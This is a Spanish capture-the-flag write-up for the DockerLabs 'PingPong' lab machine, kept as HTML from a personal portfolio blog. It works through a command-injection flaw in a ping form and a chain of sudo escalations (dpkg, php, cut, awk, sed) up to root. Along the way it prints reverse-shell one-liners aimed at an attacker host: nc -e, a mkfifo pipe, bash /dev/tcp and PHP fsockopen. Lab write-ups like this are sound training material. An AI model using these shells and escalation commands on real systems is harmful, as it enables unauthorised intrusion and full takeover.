@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=42509&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>Write-up PingPong DockerLabs :: Bienvenido a mi Portfolio</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Guia completa paso a paso de como resolver la maquina PingPong de la plataforma DockerLabs." />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="http://localhost:42509/writeups/dockerlabs/pingpong/" />
+
+
+  
+
+
+
+
+
+  
+  <link rel="stylesheet" href="http://localhost:42509/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:42509/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:42509/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:42509/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:42509/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:42509/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:42509/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:42509/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:42509/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:42509/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:42509/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:42509/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:42509/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+
+
+
+
+
+<link rel="shortcut icon" href="http://localhost:42509/favicon.png">
+<link rel="apple-touch-icon" href="http://localhost:42509/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Write-up PingPong DockerLabs">
+<meta property="og:description" content="Guia completa paso a paso de como resolver la maquina PingPong de la plataforma DockerLabs." />
+<meta property="og:url" content="http://localhost:42509/writeups/dockerlabs/pingpong/" />
+<meta property="og:site_name" content="Bienvenido a mi Portfolio" />
+
+  <meta property="og:image" content="http://localhost:42509/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2026-03-06 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="http://localhost:42509/css/custom.css">
+
+
+</head>
+<body>
+
+
+<div class="container">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="http://localhost:42509/">
+  <div class="logo">
+    Ghxstsec
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/">Inicio</a></li>
+        
+      
+        
+          <li><a href="/writeups">Writeups</a></li>
+        
+      
+        
+          <li><a href="/certificaciones">Certificaciones</a></li>
+        
+      
+        
+          <li><a href="/posts">Blog</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/" >Inicio</a></li>
+        
+      
+        
+          <li><a href="/writeups" >Writeups</a></li>
+        
+      
+        
+          <li><a href="/certificaciones" >Certificaciones</a></li>
+        
+      
+        
+          <li><a href="/posts" >Blog</a></li>
+        
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="http://localhost:42509/writeups/dockerlabs/pingpong/">Write-up PingPong DockerLabs</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2026-03-06</time><span class="post-author">Ghxstsec</span></div>
+
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="write-up-máquina-pingpong-de-dockerlabs-es">Write-Up máquina PingPong de DockerLabs [ES]<a href="#write-up-máquina-pingpong-de-dockerlabs-es" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OjohNyuCqnmWs3KMWcDTjw.png" alt="captionless image"></p>
+<p>Bueno, por aquí os dejo mi write-up de la máquina “Ping Pong” de la plataforma DockerLabs, Creada por “El Pingüino de Mario”</p>
+<h2 id="reconocimiento-inicial-y-enumeración">Reconocimiento Inicial Y Enumeración<a href="#reconocimiento-inicial-y-enumeración" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Yo normalmente comienzo efectuando un escaneo de puertos a la IP principal, para ver qué puertos tiene abiertos, me da este resultado:</p>
+<pre tabindex="0"><code>sudo nmap -p- -Pn -n -sCV -min-rate 5000 -T5 -oN targeted -v 172.17.0.2
+</code></pre><p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*W5TffDvMaiPp6jagbiGyFw.png" alt="captionless image"></p>
+<p>Podemos ver varios tipos de web:</p>
+<p>Puerto 80: Web HTTP, sin SSL, solo se puede ver un manual de apache, nada interesante</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*04pJeza_W3UCbKIq81r7Xg.png" alt="captionless image"></p>
+<p>Podemos fuzzear subdirectorios para ver si nos lleva a alguna cosa interesante:</p>
+<pre tabindex="0"><code>gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</code></pre><p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_OWR6njDxBH8cUgAIgORoQ.png" alt="captionless image"></p>
+<p>Nada, interesante, el directorio JavaScript no arroja nada importante</p>
+<p>Vamos a por el siguiente puerto:</p>
+<p>443 SSL/http Apache httpd 2.4.58 ((Ubuntu))</p>
+<p>Exactamente, lo mismo, no tiene nada importante.</p>
+<p>5000 Werkzeug httpd 3.0.1 (Python 3.12.3)</p>
+<p>Aquí sí que hay algo más interesante…</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qFHJ2vVvmds1h9sINCB7Ig.png" alt="captionless image"></p>
+<h2 id="acceso-inicial-escalada-de-freddy-a-bobby">ACCESO INICIAL, ESCALADA DE FREDDY A BOBBY<a href="#acceso-inicial-escalada-de-freddy-a-bobby" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Podemos ver un panel, con un input para poner IP address, en todo caso que este panel no este sanitizado, podríamos ejecutar una “Concatenación de comandos” en una Shell en la máquina víctima: vamos a ver que tan bien está este panel:</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:940/format:webp/1*Zgsr4tE7_0IGHv3eBzHcdw.png" alt="captionless image"></p>
+<p>Podemos ver que nos devuelve el mismo output que si ejecutamos un ping en una máquina Linux:</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:1002/format:webp/1*GLgxQy_glVE1GlCmc_RMxA.png" alt="captionless image"></p>
+<p>El concatenador más común en Linux es el semicolon, o punto y coma (;)</p>
+<p>si probamos el típico comando “id” después de la concatenación podremos ver algo bastante interesante:</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:1042/format:webp/1*VVZH75H8C32Rr1ulnWcNaA.png" alt="captionless image"></p>
+<p>tenemos <strong>Inyección de comandos en la máquina víctima</strong></p>
+<p>Probando varias reverse Shell como:</p>
+<pre tabindex="0"><code>nc 172.17.0.1 9001 -e /bin/bash
+busybox nc 172.17.0.1 -e /bin/bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 172.17.0.1 9001 &gt;/tmp/f
+</code></pre><p>Me doy cuenta de que no tenemos el binario netcat, ni curl, ni wget, ósea, hay que hacer la reverse shell con bash, de esta manera:</p>
+<pre tabindex="0"><code>bash -c &#39;bash -i &amp;&gt;/dev/tcp/172.17.0.1/9002 &lt;&amp;1&#39;
+</code></pre><p>Así que pongámoslo a prueba:</p>
+<p>Iniciamos el listener con cualquier Shell handler de nuestro gusto en la máquina atacante (netcat, penelope, socat):</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5OYiDvuCAVX5hF2AMJ11AA.png" alt="E"></p>
+<p>Ejecutamos el comando concatenado en la web y…</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zxgMwR250kmvf2AIDlV3rA.png" alt="captionless image"></p>
+<p>Estamos como el usuario Freddy, miramos por algunos binarios y nos encontramos con esto:</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:574/format:webp/1*o1ZG3NpvD1qg6-XKGK4qMQ.png" alt="captionless image"></p>
+<p>No podemos subir ni LinPeas, ni LinEnum, ningún exploit desde nuestra máquina, así que pienso que la enumeración en la escalada de privilegios será manual, y bastante fácil…</p>
+<p>Primero probamos con el típico comando sudo:</p>
+<pre tabindex="0"><code>Sudo -l
+</code></pre><p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*43IQclbLvlWorNRJXRbmsw.png" alt="captionless image"></p>
+<p>¡Upa! Tenemos sudo en el binario <strong>dpkg</strong>, en el usuario “Bobby”, miramos en <a href="https://gtfobins.org/gtfobins/dpkg/"><strong>gtfobins</strong></a> el binario <strong>dpkg:</strong></p>
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MBXUbGGc81_noiSjygKXkA.png" alt="captionless image"></p>
+<p>Mmmhhh… no me interesa, porque no tenemos el comando fpm, vamos a usar el método de “List packages”, será de esta forma:</p>
+<p>Ejecutaremos el comando “dpkg -l” con el usuario Bobby:</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:746/format:webp/1*QO-L_nJ4lwPQo_pC5UrqtA.png" alt="captionless image"></p>
+<p>Veremos este resultado: ( o algo asi )</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Gd7CeOUZyBM5wQRLu2v4Xw.png" alt="captionless image"></p>
+<p>¿Abajo veremos el “ — more — “, ahí se pueden ejecutar comandos, de qué manera? Pues con el símbolo de exclamación, ejecutaremos una bash de esta manera:</p>
+<pre tabindex="0"><code>!/bin/bash
+</code></pre><p>(Lo suyo seria escribirlo a mano)</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sGQtbbPIc0x1XhzRMc88Xg.png" alt="captionless image"></p>
+<p>¡Veremos que tenemos acceso con el usuario Bobby!</p>
+<h2 id="bobby---gladys">BOBBY -&gt; GLADYS<a href="#bobby---gladys" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>De nuevo, ejecutaremos el comando:</p>
+<pre tabindex="0"><code>sudo -l
+</code></pre><p>Nos dará este resultado:</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*j4JN3g7ue0FNVuFIRT58Uw.png" alt="captionless image"></p>
+<p>Tenemos acceso como sudo en el usuario “Gladys” Con el comando PHP, Os ahorrare tiempo, no probéis este comando:</p>
+<pre tabindex="0"><code>php -r &#39;system(&#34;/bin/sh -i&#34;);&#39;
+</code></pre><p>A mí por lo menos no me ha funcionado, me crasheaba la Shell.</p>
+<p>Probaremos ejecutando una reverse Shell a otro puerto de nuestra máquina.</p>
+<pre tabindex="0"><code>sudo -u gladys php -r &#39;$sock=fsockopen(&#34;TU_IP&#34;,6666);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;
+</code></pre><p>¡Recordad poner en escucha el Shell handler!</p>
+<p>y…</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_9dd5XAjPq0yFZcG8-6rDg.png" alt="captionless image"><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6I_CbhouR3QKyX0ZQ1AEpA.png" alt="captionless image"></p>
+<p>¡Tenemos Shell estable con el usuario Gladys!</p>
+<h2 id="gladys---chocolatito">Gladys -&gt; Chocolatito<a href="#gladys---chocolatito" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Volvemos a ejecutar el comando:</p>
+<pre tabindex="0"><code>sudo -l
+</code></pre><p>Tendremos este resultado:</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*12wNLRoukI3WXuT0QJvfNw.png" alt="captionless image"></p>
+<p>Tenemos acceso sudo con el usuario chocolatito en el comando cut, ahora se complica, porque no nos podemos spawnear una Shell con un simple comando, asi que vamos a buscar archivos y carpetas con “Ownership” de chocolatito:</p>
+<pre tabindex="0"><code>find / -user chocolatito 2&gt;/dev/null
+</code></pre><p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*hcMxtohKEgbSDrdLXMLNbQ.png" alt="captionless image"></p>
+<p>vamos al directorio y abriremos el comando cut, cuál tiene ownership de sudo por el usuario chocolatito, para leer el archivo “chocolatitocontraseña.txt”</p>
+<pre tabindex="0"><code>cd /opt
+sudo -u chocolatito cut -d &#34;&#34; -f1 chocolatitocontraseña.txt
+</code></pre><p><img src="https://miro.medium.com/v2/resize:fit:1388/format:webp/1*yOn5EVQz_YQ5dZQeMOkKFw.png" alt="captionless image"></p>
+<p>Y tendremos la contraseña para el usuario chocolatito.</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:622/format:webp/1*l_05c81JyFdeCHQsBl-Yxw.png" alt="captionless image"></p>
+<h2 id="chocolatito---theboss">Chocolatito -&gt; theboss<a href="#chocolatito---theboss" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>De nuevo, volveremos a usar el comando:</p>
+<pre tabindex="0"><code>sudo -l
+</code></pre><p>Con este resultado:</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BcS48MUJ9yD96tWqX8WivQ.png" alt="captionless image"></p>
+<p>buscaremos el binario <strong>awk</strong> en la web de <a href="https://gtfobins.org/gtfobins/awk/"><strong>gtfobins</strong></a><strong>:</strong></p>
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WZ9cFZmbTvNKslruMiO9sQ.png" alt="captionless image"></p>
+<p>Nos da el comando:</p>
+<pre tabindex="0"><code>mawk &#39;BEGIN {system(&#34;/bin/sh&#34;)}&#39;
+</code></pre><p>Entonces nuestro comando final construido para la ejecución en el usuario theboss sería:</p>
+<pre tabindex="0"><code>sudo -u theboss /usr/bin/awk &#39;BEGIN {system(&#34;/bin/sh&#34;)}&#39;
+</code></pre><p>con este resultado:</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:1376/format:webp/1*FwHTvril3xaVzAA8XKg49g.png" alt="captionless image"></p>
+<p>Ya tendríamos la Shell con el usuario theboss, nos estabilizaremos la Shell:</p>
+<pre tabindex="0"><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39; \
+export TERM=xterm
+</code></pre><p>No podemos hacer ctrl+z, pero ya se nos quedará una Shell bastante utilizable.</p>
+<h2 id="theboss---root-por-fin"><strong>theboss -&gt; Root (por fin)</strong><a href="#theboss---root-por-fin" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>volveremos a utilizar el comando:</p>
+<pre tabindex="0"><code>sudo -l
+</code></pre><p>con este resultado:</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*N04PjLN3rIqmckWhuHf4Yw.png" alt="captionless image"></p>
+<p>buscamos <strong>sed</strong> en <a href="https://gtfobins.org/gtfobins/sed/"><strong>gtfobins</strong></a>:</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gmDhee1x3EOdI_M90kEssg.png" alt="captionless image"></p>
+<p>Nos devuelve este comando:</p>
+<pre tabindex="0"><code>sed -n &#39;1e exec /bin/sh 1&gt;&amp;0&#39; /etc/hosts
+</code></pre><p>entonces el comando construido para ejecutarlo como root sería:</p>
+<pre tabindex="0"><code>sudo -u root sed -n &#39;1e exec /bin/sh 1&gt;&amp;0&#39; /etc/hosts \
+Ctrl + l
+</code></pre><p>He puesto el ctrl + l en el bloque de comando con tal de limpiar la terminal por si nos hace overlap con otros comandos de la terminal.</p>
+<p>y…</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BFO2eHc0Vr36GpIIwO_CRg.png" alt="captionless image"></p>
+<p>Y hasta aquí llego la máquina Ping Pong de DockerLabs.</p>
+<p>Muchas gracias por leer este Write-up</p>
+<p>¡Hasta pronto!</p>
+<pre tabindex="0"><code>👋 Sobre el autor
+
+¡Hola! Soy Ghxstsec (Joel Morillas), un entusiasta de la ciberseguridad y pentester. Me dedico a documentar mi viaje por el complejo mundo de la seguridad ofensiva.
+
+Actualmente, poseo las certificaciones eJPTv2 y eCPPTv3. Mi objetivo es intentar ayudar a sobrellevar la brecha entre el aprendizaje teórico y la práctica, al tiempo que comparto mis experiencias sinceras con la comunidad. Cuando no estoy en una maratón de exámenes de 24 horas, me puedes encontrar haciendo ejercicios en Try Hack Me o investigando los últimos artículos sobre ciberseguridad.
+
+✉️ Conéctate conmigo:
+
+LinkedIn: [LinkedIn](https://www.linkedin.com/in/joel-morillas-aka-ghxstsec-16a988260/)
+GitHub: [GitHub](https://github.com/Ghxstsec)
+Twitter/X: [Twitter](https://x.com/Louikizz)
+Try Hack Me: [THM](https://tryhackme.com/p/Ghxstsec)
+
+¡Muchas gracias por leer todo el artículo! ¡Te deseo mucha suerte en tus próximos logros! 😊
+</code></pre>
+      </div></div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
